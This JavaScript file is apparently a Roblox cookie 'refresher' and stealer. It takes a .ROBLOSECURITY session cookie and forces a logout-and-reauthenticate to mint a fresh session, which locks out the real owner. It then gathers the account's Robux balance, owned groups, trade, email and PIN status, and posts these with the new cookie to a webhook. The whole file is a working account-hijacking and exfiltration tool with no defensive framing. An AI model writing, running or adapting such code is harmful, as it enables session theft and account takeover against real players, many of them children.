const axios = require('axios');

const cookie = "lol"
const webhook = "webkuk"

try {
    await axios.post(
      'https://friends.roblox.com/v1/users/1/request-friendship',
      '',
      {
        headers: {
          'accept': 'application/json',
          'cookie': `.ROBLOSECURITY=${cookie}`
        }
      }
    );
} catch (error) {
    xtoken = error.response.headers["x-csrf-token"]
    if (xtoken == undefined) {
    return console.log("Invalid Cookie")
    }
    refreshed = await axios.post(
    'https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate',
    {},
    {
        headers: {
        'content-type': 'application/json;charset=UTF-8',
        'cookie': `.ROBLOSECURITY=${cookie}`,
        'x-csrf-token': xtoken
        }
    }
    )
    const [, refcookie] = /\.ROBLOSECURITY=(.+?); domain=.roblox.com;/.exec(refreshed.headers["set-cookie"].find(str => /\.ROBLOSECURITY=(.+?); domain=.roblox.com;/.test(str)));
    mobapi = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
    headers: {
        'cookie': `.ROBLOSECURITY=${refcookie}`
    }
    })
    uinfo = mobapi.data
    pending = (await axios.get(`https://economy.roblox.com/v2/users/${uinfo.UserID}/transaction-totals`, {
    params: {
        'transactionType': 'summary'
    },
    headers: {
        'cookie': `.ROBLOSECURITY=${refcookie}`
    }
    })).data.pendingRobuxTotal
    groupRoles = (await axios.get(`https://groups.roblox.com/v2/users/${uinfo.UserID}/groups/roles`, {
    headers: {
        'cookie': `.ROBLOSECURITY=${refcookie}`
    }
    })).data.data
    groupAmount = 0
    groupRoles.forEach(group => {
    if (group.role.rank == 255) {
        groupAmount += 1
    }
    });
    tradePrivacy = (await axios.get('https://accountsettings.roblox.com/v1/trade-privacy', {
    headers: {
        'cookie': `.ROBLOSECURITY=${refcookie}`
    }
    })).data.tradePrivacy
    emailverification = (await axios.get('https://accountsettings.roblox.com/v1/email', {
    headers: {
        'cookie': `.ROBLOSECURITY=${refcookie}`
    }
    })).data.verified
    pinCode = (await axios.get('https://auth.roblox.com/v1/account/pin', {
    headers: {
        'cookie': `.ROBLOSECURITY=${refcookie}`
    }
    })).data.isEnabled

    await axios.post(
    webhook,
    {
        "embeds": [
            {
            "title": "Refreshed cookie",
            "url": `https://www.roblox.com/users/${uinfo.UserID}`,
            "color": null,
            "fields": [
                {
                "name": "**Username**",
                "value": `${uinfo.UserName}`,
                "inline": true
                },
                {
                "name": "**Robux (Pending)**",
                "value": `${uinfo.RobuxBalance} (${pending})`,
                "inline": true
                },
                {
                "name": "**Group Owned**",
                "value": `${groupAmount}`,
                "inline": true
                },
                {
                "name": "**Premium**",
                "value": `${uinfo.IsPremium}`,
                "inline": true
                },
                {
                "name": "**Can Trade With**",
                "value": `${tradePrivacy}`,
                "inline": true
                },
                {
                "name": "**Email Verified**",
                "value": `${emailverification}`,
                "inline": true
                },
                {
                "name": "**Pin**",
                "value": `${pinCode}`,
                "inline": true
                },
                {
                "name": "**Cookie:**",
                "value": `\`\`\`${refcookie}\`\`\``
                }
            ],
            "thumbnail": {
                "url": `${uinfo.ThumbnailUrl}`
            }
            }
        ]
        }
    )
}